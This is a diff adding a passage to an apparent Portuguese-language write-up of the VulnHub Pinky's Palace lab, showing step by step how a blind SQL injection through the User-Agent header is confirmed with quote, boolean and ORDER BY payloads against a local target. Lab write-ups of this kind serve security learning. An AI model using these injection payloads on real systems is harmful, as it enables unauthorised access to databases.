@@ -170,3 +170,78 @@ Repeater
 
 Depois de muita tentativa, sem sucesso de fazermos algum tipo de sqlinjection com o usuário e senha, passamos a tentar com o User-Agent, que também aparece no log, a grande questão aqui é que temos um SQLi Blind, ou seja, não vemos a saída de erro, isso deixa o trabalho um pouco mais difícil de se conseguir realizar.
 
+# User-Agent Blind SQLinjection
+
+Encontramos um bom ponto de referência para fazermos o SQLinjection nesse User-Agent
+
+https://sechow.com/bricks/docs/content-page-4.html
+
+Vamos lá, tentar explicar cada passo. Vamos ir alterando o User-Agent e ir verificando no log.php as alterações, se foram efetivas ou não.
+
+```
+User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:15.0) Gecko/20100101 Firefox/15.0
+SQL Query: SELECT * FROM users WHERE ua='Mozilla/5.0 (Windows NT 6.2; rv:15.0)
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind.png)
+
+http://127.0.0.1:8080/littlesecrets-main/logs.php
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind1.png)
+
+Aqui o parâmetro User-Agent está aceitando o input do browser. Normalmente, esse valor não pode ser modificado, mas podemos tentar mudar isso para ver o comportamento dele.
+
+```
+User-Agent: SQLI
+SQL Query: SELECT * FROM users WHERE ua='SQLI'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind2.png)
+
+http://127.0.0.1:8080/littlesecrets-main/logs.php
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind3.png)
+
+Aqui o User-Agent foi modificado e a página retorna um valor válido
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind4.png)
+
+```
+User-Agent: SQLI'
+SQL Query: SELECT * FROM users WHERE ua='SQLI''
+```
+
+Não há saida na página de log. Significa que o parâmetro User-Agent é vulnerável a code injection e o código que nós injetamos quebrou a query. O código tem que ser feito de uma maneira que não quebre a requisição SQL. O próximo passo agora é colocar uns comandos SQL pra verificar se realmente temos a vulnerabilidade.
+
+```
+User-Agent: SQLI' and 1='1
+SQL Query: SELECT * FROM users WHERE ua='SQLI' AND 1='1'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind5.png)
+
+Aqui a página deu retorno 0, isso foi por que temos uma saída verdadeira.
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind6.png)
+
+```
+User-Agent: SQLI' and 1='2
+SQL Query: SELECT * FROM users WHERE ua='SQLI' AND 1='2'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind7.png)
+
+Aqui também mostrou uma mensagem, a query é falsa mas é possível, por isso foi mostrada
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind8.png)
+
+Agora vamos descobrir a quantidade de colunas que tem no banco de dados
+
+```
+User-Agent: SQLI' order by 1 -- +
+SQL Query: SELECT * FROM users WHERE ua='SQLI' ORDER BY 1 -- +'
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-pinkyspalace1/blind9.png)
+
+Não mostrou mensagem de erro no log, ou seja, não é uma query válida
